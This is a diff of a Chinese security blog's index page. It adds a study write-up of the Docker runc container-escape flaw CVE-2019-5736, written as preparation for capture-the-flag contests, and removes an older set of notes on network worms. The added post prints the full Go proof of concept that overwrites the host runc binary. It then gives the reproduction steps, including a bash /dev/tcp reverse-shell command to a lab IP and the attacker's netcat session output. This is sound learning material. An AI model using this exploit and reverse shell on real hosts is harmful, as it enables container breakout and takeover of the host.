@@ -150,6 +150,163 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/14/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/14/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">容器逃逸学习 (1)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-10-14 19:02:57" itemprop="dateCreated datePublished" datetime="2023-10-14T19:02:57+08:00">2023-10-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-16 17:01:45" itemprop="dateModified" datetime="2023-10-16T17:01:45+08:00">2023-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">容器逃逸系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>6.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>6 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>近年来，有些pwn题会出一些有关于容器逃逸的题目，虽然很多都是板子题，但如果没有学过相关内容，比赛的时候还是会两眼一抹黑。因此本文将开始容器逃逸的相关内容学习。</p>
+<p>笔者的计划是，通过具体的已发布的漏洞开始，逐步向底层逻辑前进。</p>
+<p>在这第1篇文章中，我们从一个CVE漏洞开始——CVE-2019-5736，作为容器逃逸的入门。</p>
+<p>主要参考资料：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/266144563">传送门</a>（笔者觉得这篇文章写的非常好）</p>
+<p>这是一个著名的Docker容器逃逸漏洞，影响范围为：Docker 18.09.2及以前，这些版本的Docker使用了1.0-rc6及以下的docker-runc从而导致漏洞。漏洞的成因是攻击者对主机的runc二进制文件进行重写，从而在提权的同时完成逃逸。下面我们就来具体了解一下这个漏洞本身。</p>
+<h1 id="1-docker架构简介"><a class="markdownIt-Anchor" href="#1-docker架构简介"></a> 1. Docker架构简介</h1>
+<p>要了解这个漏洞，首先就要了解docker-runc是干什么的。我们从<a target="_blank" rel="noopener" href="https://download.docker.com/linux/static/test/x86_64/">这里</a>可以下载到各种版本的Docker，其中大多都是压缩包。解压压缩包我们会发现其中有几个可执行文件：</p>
+<ul>
+<li>docker: Docker客户端程序，也是我们最常用的elf，用于对镜像、容器等进行操作。</li>
+<li>docker-containerd: 一个与Docker容器有关的守护进程，用于管理容器的创建、运行和销毁等操作。</li>
+<li>docker-containerd-ctr: 与docker-containerd交互的命令行程序。</li>
+<li>docker-containerd-shim: docker-containerd-ctr和docker-containerd的中间进程，负责通信等工作。</li>
+<li><font color=red>dockerd</font>: Docker服务器进程。我们需要知道的是，Docker是以CS架构开发的，平时使用docker命令实质上也都是在和dockerd这个本地的服务器进程进行交互。</li>
+<li>docker-init: 轻量级的初始化进程，用于完成容器创建时的初始化操作，并作为容器进程的父进程。</li>
+<li>docker-proxy: 网络代理程序，负责容器之间的通信。</li>
+<li>docker-runc: 轻量级的容器运行时工具，用于创建和运行容器，负责解析容器的配置并构建隔离环境。</li>
+</ul>
+<p>也就是说，这个漏洞主要是对这个运行时工具进行攻击。</p>
+<h1 id="2-cve-2019-5736介绍"><a class="markdownIt-Anchor" href="#2-cve-2019-5736介绍"></a> 2. CVE-2019-5736介绍</h1>
+<p>这个漏洞的PoC可以在<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">这里</a>找到。</p>
+<p>我们来结合这个PoC对这个漏洞的成因与利用方式进行分析。</p>
+<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellCmd <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.StringVar(&amp;shellCmd, <span class="string">&quot;shell&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Execute arbitrary commands&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line">	<span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n&quot;</span> + shellCmd</span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">	<span class="comment">// This will be the process created by runc</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="type">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">	<span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] The command executed is&quot;</span> + payload)</span><br><span class="line">			writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="a-覆盖binsh"><a class="markdownIt-Anchor" href="#a-覆盖binsh"></a> A. 覆盖/bin/sh</h2>
+<p>在PoC中可以看到，<code>fmt.Fprintln</code>将/bin/sh这个<strong>二进制</strong>文件的前面几个字节修改成了<code>#!/proc/self/exe\n</code>，什么意思呢？这相当于迷惑了Linux系统，将它视作一个Linux Shell文件而不是ELF二进制可执行文件。通过这种覆盖，/bin/sh仍然可以执行，但实际上它完成的将不再是/bin/sh原本的功能，而是跑去执行<code>/proc/self/exe</code>这个文件。</p>
+<p>那么<code>/proc/self/exe</code>这个文件又是什么？为什么要执行这个文件呢？在文章开头的资料中给出了答案。</p>
+<h2 id="b-找到docker-runc进程"><a class="markdownIt-Anchor" href="#b-找到docker-runc进程"></a> B. 找到docker-runc进程</h2>
+<p>在<code>/proc</code>目录中，有很多以数字命名的目录，每一个数字都代表当前一个进程的进程号，而目录中则提供了与这个进程有关的文件，其中就有exe文件。这个文件是一个<strong>符号链接</strong>，指向创建这个进程的可执行文件或这个进程加载的动态链接库。</p>
+<p>好，现在我们已经知道进程的可执行文件本身能够在/proc中找到，那么这和本文要讲的CVE有什么关系呢？这就需要了解一下docker-runc的工作原理了。在启动一个容器时，docker-runc会首先构建文件系统等配置，然后fork一次，在子进程调用容器的启动文件完成启动。这样做的结果是，docker-runc这个进程本身也能在容器的进程列表中找到。既然docker-runc在容器中也拥有一个进程号，我们就能够通过遍历所有进程找到它。</p>
+<p>具体的遍历方法是：遍历所有进程的cmdline文件并查找runc字符串。cmdline文件顾名思义，保存了进程的命令行参数。如果docker-runc程序位于进程表中，runc一定能够在命令行参数中找到。</p>
+<h2 id="c-尝试以只读方式打开runc文件"><a class="markdownIt-Anchor" href="#c-尝试以只读方式打开runc文件"></a> C. 尝试以只读方式打开runc文件</h2>
+<p>找到了我们要的进程号之后，我们就可以打开对应的exe文件了。但需要注意的是，这个文件本身是只读的，我们不能直接以读写模式打开，因此这里利用了一个/proc文件的特性。<strong>打开/proc目录下的文件时，不受mnt命名空间的影响，在进行权限检查后就能直接获得文件描述符。</strong></p>
+<p>对于一个普通路径下的文件，当进程打开这个文件时，mnt命名空间会对路径进行解析，并生成文件系统视图，确定进程是否能够打开这个文件。但是对于/proc目录则不受mnt命名空间的影响，这使得以其他权限打开文件描述符成为可能，也即——绕过了mnt命名空间的约束。经过与老师的讨论，我不将这个特性视为Linux系统的漏洞。</p>
+<p>需要注意的是，打开这个文件本身需要在容器中具有root权限，如果没有，则可能还需要完成提权。</p>
+<h2 id="d-以读写方式打开文件描述符"><a class="markdownIt-Anchor" href="#d-以读写方式打开文件描述符"></a> D. 以读写方式打开文件描述符</h2>
+<p>以只读方式打开exe文件后，可通过以读写方式打开文件描述符的方式绕过权限限制，打开exe文件，实际上就是docker-runc文件。考虑到Linux系统中不允许修改正在执行的程序文件，因此这里需要多次尝试，在docker-runc停止工作时以抢占的方式打开这个文件。</p>
+<h2 id="e-篡改主机的docker-runc文件注入payload"><a class="markdownIt-Anchor" href="#e-篡改主机的docker-runc文件注入payload"></a> E. 篡改主机的docker-runc文件，注入payload</h2>
+<p>当docker-runc文件可写后，我们就可以向其中写入任意代码并执行。</p>
+<h1 id="3-cve-2019-5736复现"><a class="markdownIt-Anchor" href="#3-cve-2019-5736复现"></a> 3. CVE-2019-5736复现</h1>
+<h2 id="a-准备工作"><a class="markdownIt-Anchor" href="#a-准备工作"></a> A. 准备工作</h2>
+<p>为了复现这个漏洞，我们需要下载18.09.2以下版本的docker。这里推荐一个仓库，可以很方便地安装用于漏洞复现的docker环境：<a target="_blank" rel="noopener" href="https://github.com/Metarget/metarget">链接</a>。下面是下载版本：</p>
+<ul>
+<li>docker: 18.03.1-ce</li>
+<li>镜像：Ubuntu 16.04（这个需要注意，由于我们使用的docker版本比较低，如果下载18.04及以上的Ubuntu会报错：Error response from daemon: missing signature key，只能下载更低版本的Ubuntu。）</li>
+<li>容器创建：docker run -it ubuntu:16.04 /bin/bash</li>
+</ul>
+<h2 id="b-编译文件"><a class="markdownIt-Anchor" href="#b-编译文件"></a> B. 编译文件</h2>
+<p>最新版本的PoC中将要执行的命令移动到了命令行参数中，方便我们灵活地执行任意代码。PoC仓库：<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">链接</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+<p>之后将编译好的PoC复制到docker容器。</p>
+<h2 id="c-触发漏洞"><a class="markdownIt-Anchor" href="#c-触发漏洞"></a> C. 触发漏洞</h2>
+<p>笔者初学容器逃逸，按照网上的方法尝试了很多次，才终于找到漏洞触发的方法。最后发现是网上的方法说的不详细。</p>
+<h3 id="step-1"><a class="markdownIt-Anchor" href="#step-1"></a> Step 1</h3>
+<p>在另一台虚拟机（192.168.198.135）中打开50000端口的监听，设置PoC的任意执行命令为反弹shell命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.198.135/50000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h3 id="step-2"><a class="markdownIt-Anchor" href="#step-2"></a> Step 2</h3>
+<p>用bash作为命令行打开容器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it &lt;容器名&gt; bash</span><br></pre></td></tr></table></figure>
+<h3 id="step-3"><a class="markdownIt-Anchor" href="#step-3"></a> Step 3</h3>
+<p>apt update，安装netcat。</p>
+<p>复制PoC二进制ELF执行PoC代码，立即可以看到/bin/sh被覆盖的提示信息，但是一直找不到runc进程，这是因为目前docker还没有需要runc参与的任务。</p>
+<h3 id="step-4"><a class="markdownIt-Anchor" href="#step-4"></a> Step 4</h3>
+<p>在主机另一个终端打开容器的命令行让PoC检测到runc。但这次一定要用/bin/sh打开命令行而不是bash。docker exec命令执行后瞬间就可以看到runc进程被修改的提示信息。在新的终端中用sh无法打开容器的命令行，显示<code>No help topic for '/bin/sh'</code>。</p>
+<h3 id="step-5"><a class="markdownIt-Anchor" href="#step-5"></a> Step 5</h3>
+<p>在新的终端再一次尝试用sh打开容器的命令行，随后命令行阻塞，成功执行反弹shell代码，下面是攻击者机器的部分命令行显示内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@colin-virtual-machine:~/Desktop<span class="comment"># nc -vv -lp 50000</span></span><br><span class="line">Listening on 0.0.0.0 50000</span><br><span class="line">Connection received on 192.168.198.xxx 42248</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (8750): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">16505d598214f0c33ba21d8e96f5ecf34db215d32ba229527a67314d7ed96c7a.pid</span><br><span class="line">config.json</span><br><span class="line">init.pid</span><br><span class="line">log.json</span><br><span class="line">rootfs</span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># uname -a</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu 5.4.0-150-generic <span class="comment">#167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/run/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/cf90012c3bea6ddebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339</span><br><span class="line">&lt;ebe2896995719366ddc8dd1893c0081bff30f6c5cf7d3c339<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<p>复现完毕。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/25/buuctf-pwn-write-ups-13/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2237,165 +2394,6 @@ ver_K(x,(\gamma,\delta))=true\Leftrightarrow(\alpha<sup>{e_1}\beta</sup>{e_2}\mo
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/03/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%AC%AC8%E7%AB%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/03/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%AC%AC8%E7%AB%A0/" class="post-title-link" itemprop="url">软件安全——第78章</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-03-03 09:44:44 / Modified: 09:47:34" itemprop="dateCreated datePublished" datetime="2023-03-03T09:44:44+08:00">2023-03-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">软件安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>586</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>1 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="chapter-8-网络蠕虫"><a class="markdownIt-Anchor" href="#chapter-8-网络蠕虫"></a> Chapter 8 网络蠕虫</h1>
-<h2 id="81-定义"><a class="markdownIt-Anchor" href="#81-定义"></a> 8.1 定义</h2>
-<p>蠕虫的基本特征：</p>
-<ul>
-<li>能够进行传播</li>
-<li>能够进行自我复制</li>
-</ul>
-<p><strong>计算机蠕虫可以独立运行，并能把自身的一个包含所有功能的版本传播到另外的计算机上。</strong></p>
-<p>第一个蠕虫：Morris蠕虫。</p>
-<ul>
-<li>利用的漏洞：
-<ul>
-<li>Rsh/exec：用户缺省认证</li>
-<li>Sendmail的debug模式</li>
-<li>Fingerd缓冲区溢出</li>
-</ul>
-</li>
-</ul>
-<h2 id="82-分类"><a class="markdownIt-Anchor" href="#82-分类"></a> 8.2 分类</h2>
-<ul>
-<li>漏洞利用类蠕虫：利用计算机系统的漏洞进行破坏与传播。如Stuxnet</li>
-<li>口令破解类蠕虫：通过弱口令进入目标系统。</li>
-<li>邮件传播类蠕虫</li>
-<li>即时通信类蠕虫：通过即使通信进行传播。</li>
-<li>其他：如USB蠕虫等</li>
-</ul>
-<h2 id="83-基本功能"><a class="markdownIt-Anchor" href="#83-基本功能"></a> 8.3 基本功能</h2>
-<ol>
-<li><strong>信息搜集</strong>：对本地和目标节点主机的信息汇集
-<ul>
-<li>信息搜集模块需要<strong>为发现易感染目标提供支持</strong>，搜集包括本机系统信息、用户信息、对本机的信任或者授权的主机、本机所处的网络拓朴结构、边界路由信息等。（即寻找下一个感染目标）</li>
-</ul>
-</li>
-<li><strong>扫描探测</strong>：对具体的目标主机的服务漏洞检测
-<ul>
-<li>扫描探测模块完成特定目标的脆弱性检测，发现易感染目标。</li>
-</ul>
-</li>
-<li><strong>攻击渗透</strong>：利用发现的服务漏洞实现攻击</li>
-<li><strong>自我推进</strong>：完成对目标结点的感染
-<ul>
-<li>自我推进模块需要在本机与目标主机之间完成蠕虫副本传递，使蠕虫正式“进驻”该目标机器。</li>
-</ul>
-</li>
-</ol>
-<h2 id="84-蠕虫防护"><a class="markdownIt-Anchor" href="#84-蠕虫防护"></a> 8.4 蠕虫防护</h2>
-<ul>
-<li>个人用户
-<ul>
-<li>及时修补补丁</li>
-<li>使用防火墙软件</li>
-<li>关注流量的异常性</li>
-</ul>
-</li>
-<li>网络管理者
-<ul>
-<li>网关阻断</li>
-<li>补丁下发</li>
-</ul>
-</li>
-<li>网络应用厂商
-<ul>
-<li>应用流量过滤与阻断</li>
-<li>补丁自动分发与修补</li>
-</ul>
-</li>
-<li>安全厂商
-<ul>
-<li>网络流量分析与提取</li>
-<li>网络安全设备快速阻断</li>
-<li>快速利用客户端安全软件清除蠕虫个体，进行补丁修复</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2465,7 +2463,7 @@ ver_K(x,(\gamma,\delta))=true\Leftrightarrow(\alpha<sup>{e_1}\beta</sup>{e_2}\mo
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-count">146</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2523,7 +2521,7 @@ ver_K(x,(\gamma,\delta))=true\Leftrightarrow(\alpha<sup>{e_1}\beta</sup>{e_2}\mo
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">19:44</span>
+    <span title="Reading time total">19:59</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
